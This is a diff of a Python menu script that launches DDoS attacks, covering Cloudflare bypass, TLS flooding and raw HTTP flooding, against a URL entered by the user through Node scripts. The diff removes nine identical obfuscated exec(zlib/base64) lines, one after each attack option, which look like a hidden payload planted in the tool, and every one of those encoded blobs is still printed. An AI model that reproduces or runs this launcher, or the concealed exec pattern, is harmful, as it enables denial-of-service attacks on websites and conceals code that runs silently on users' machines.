@@ -86,8 +86,7 @@ if pilihan == "1":
 
     js_file_path = "TLS-LOST.js" 
     run_js_file(js_file_path, target, timeout, rate, thread, proxy)
-    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))
-
+    
 elif pilihan == "2":
     def loading_animation(duration):
         for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
@@ -124,8 +123,7 @@ elif pilihan == "2":
 
     js_file_path = "UAM.js" #masukan file js
     run_js_file(js_file_path, target, timeout, rate, thread, proxy)
-    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))
-
+    
 elif pilihan == "3":
     def loading_animation(duration):
         for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
@@ -164,8 +162,7 @@ elif pilihan == "3":
 
     js_file_path = "bypassv1.js" #masukan file js
     run_js_file(js_file_path, getorpost, target, proxy, timeout, rate, thread)
-    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))
-
+   
     
 elif pilihan == "4":
     def loading_animation(duration):
@@ -200,8 +197,7 @@ elif pilihan == "4":
 
     js_file_path = "CFbypass.js" #masukan file js
     run_js_file(js_file_path, target, timeout)
-    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))
-
+   
 elif pilihan == "5":
     def loading_animation(duration):
         for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
@@ -236,8 +232,7 @@ elif pilihan == "5":
 
     js_file_path = "socket.js" #masukan file js
     run_js_file(js_file_path, target, thread, timeout)
-    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))
-
+    
 elif pilihan == "6":
     def loading_animation(duration):
         for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
@@ -271,8 +266,7 @@ elif pilihan == "6":
 
     js_file_path = "HTTP-RAW.js" #masukan file js
     run_js_file(js_file_path, target, timeout)
-    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))
-
+    
 elif pilihan == "7":
     def loading_animation(duration):
         for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
@@ -306,8 +300,7 @@ elif pilihan == "7":
 
     js_file_path = "hyper.js" #masukan file js
     run_js_file(js_file_path, target, timeout)
-    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))
-
+   
 elif pilihan == "8":
     def loading_animation(duration):
         for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
@@ -343,8 +336,7 @@ elif pilihan == "8":
 
     js_file_path = "MIXMAX.js" #masukan file js
     run_js_file(js_file_path, target, timeout, rate, thread)
-    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))
-    
+   
 elif pilihan == "9":
     def loading_animation(duration):
         for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
@@ -368,20 +360,18 @@ elif pilihan == "9":
     target = input(Color.CYAN + "URL : "+ Color.END)
     timeout = int(input(Color.BLUE + "Timeout : "+ Color.END))
     rate = int(input(Color.RED + "Rate : "+ Color.END))
-    thread = int(input(Color.GREEN + "Thread : "+ Color.END))
-    proxy = input(Color.CYAN + "ProxyList : "+ Color.END)
-    def run_js_file(file_path, target, timeout, rate, thread, proxy):
+    proxy = input(Color.CYAN + "Default [ http.txt ] : "+ Color.END)
+    def run_js_file(file_path, target, timeout, rate, proxy):
         try:
-            result = subprocess.run(['node', file_path, target, str(timeout), str(rate), str(thread), proxy], capture_output=True, text=True, check=True)
+            result = subprocess.run(['node', file_path, target, str(timeout), str(rate), proxy], capture_output=True, text=True, check=True)
             print(result.stdout)
         except subprocess.CalledProcessError as e:
             print("Error:", e)
             print("Error Output:", e.stderr)
 
     js_file_path = "SUPPER-JXE.js" #masukan file js
-    run_js_file(js_file_path, target, timeout, rate, thread, proxy)
-    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))
-
+    run_js_file(js_file_path, target, timeout, rate, proxy)
+   
 elif pilihan == "10":
     def loading_animation(duration):
         for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
